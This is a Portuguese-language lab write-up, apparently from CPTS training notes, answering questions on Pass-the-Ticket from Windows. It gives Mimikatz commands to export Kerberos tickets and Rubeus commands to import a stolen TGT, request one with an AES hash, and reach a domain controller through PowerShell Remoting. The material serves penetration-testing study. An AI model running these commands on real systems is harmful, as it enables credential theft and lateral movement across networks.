> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/pass-the-ticket-ptt-from-windows/questions.md).

# Questions

1. Conecte-se à máquina de destino usando RDP e as credenciais fornecidas. Exporte todos os tickets presentes no computador. Quantos tickets de usuário (TGT) você coletou

* Podemos coletar todos os tickets de um sistema usando o `Mimikatz` com o módulo `sekurlsa::tickets /export`&#x20;

{% code lineNumbers="true" %}

```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exii
dir *.kirbi
```

{% endcode %}

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2F22dAdsGO4JUsn1wo3QYD%2Fimage.png?alt=media&amp;token=b26a1ede-8f8b-496b-8e26-ad5d92245a11" alt=""><figcaption></figcaption></figure>

***

2. Use o TGT de John para realizar um ataque Pass the Ticket e recuperar a flag da pasta compartilhada \DC01.inlanefreight.htb\john

* Vamos importar o ticket para a sessão atual usando o `.kirbi` arquivo do disco.

```
Rubeus.exe ptt /ticket:[0;944d6]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FEVvISpmSc8KM1IsDF2xI%2Fimage.png?alt=media&amp;token=65699d65-ac70-4cec-9e21-b0f15515dd45" alt=""><figcaption></figcaption></figure>

***

3. Use o TGT de John para realizar um ataque Pass the Ticket e conectar-se ao DC01 usando o PowerShell Remoting. Leia o sinalizador de C:\john\john.txt

**Rubeus - PowerShell Remoting with Pass the Ticket**

* Crie um processo sacrificial com Rubeus

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

* O comando acima abrirá uma nova janela do cmd. A partir dessa janela, podemos executar o Rubeus para solicitar um novo TGT com a opção `/ptt`de importar o ticket para nossa sessão atual e conectar ao DC usando o PowerShell Remoting.

**Rubeus - Passe o bilhete para movimento lateral**

{% code lineNumbers="true" %}

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<hash> /ptt
powershell
Enter-PSSession -ComputerName DC01
```

{% endcode %}

<div align="left"><figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FBvp2RNWWPe75DXU9kpNh%2Fimage.png?alt=media&amp;token=5d723838-6752-4648-b125-010b0e6a0e41" alt=""><figcaption></figcaption></figure></div>
